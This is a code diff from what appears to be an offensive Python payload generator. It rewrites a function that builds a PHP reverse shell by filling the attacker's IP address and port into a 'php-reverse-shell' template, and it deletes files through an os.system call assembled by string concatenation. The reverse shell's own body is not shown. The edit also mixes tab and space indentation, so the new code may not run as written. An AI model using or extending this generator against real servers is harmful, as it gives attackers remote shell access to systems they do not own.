@@ -175,26 +175,19 @@ def oneliner(shellcode):
 
 #Edit PHP Monkey's File	
 def php_file():
-	#for line in fileinput.input('php-reverse-shell.php', inplace = 1): 
-	#	print line.replace("127.0.0.1", IP_ADDR),
-	#	fileinput.close()
-	#for line in fileinput.input('php-reverse-shell.php', inplace = 1): 
-	#	print line.replace("1234", PORT),
-	#	fileinput.close()
-	fin = open("php-reverse-shell.php")
-	fout = open("b.txt", "wt")
+        filename = "php-reverse-shell.php"
+        os.system("rm " + filename)
+	fin = open("php-reverse-shell-template.php")
+	fout = open(filename, "wt")
 	for line in fin:
-		fout.write( line.replace('127.0.0.1', IP_ADDR) )
+            if '127.0.0.1' in line :
+                fout.write( line.replace('127.0.0.1', IP_ADDR) )
+            elif '1234' in line:
+                fout.write( line.replace('1234', PORT) )
+            else:    
+                fout.write(line)
 	fin.close()
 	fout.close()
-
-	fin1 = open("b.txt")
-	fout1 = open("yourpythonfile.php", "wt")
-	for line in fin1:
-		fout1.write( line.replace('1234', PORT) )
-	fin1.close()
-	fout1.close()
-	os.system('rm b.txt')
 
 # =======================
 #    MENUS DEFINITIONS
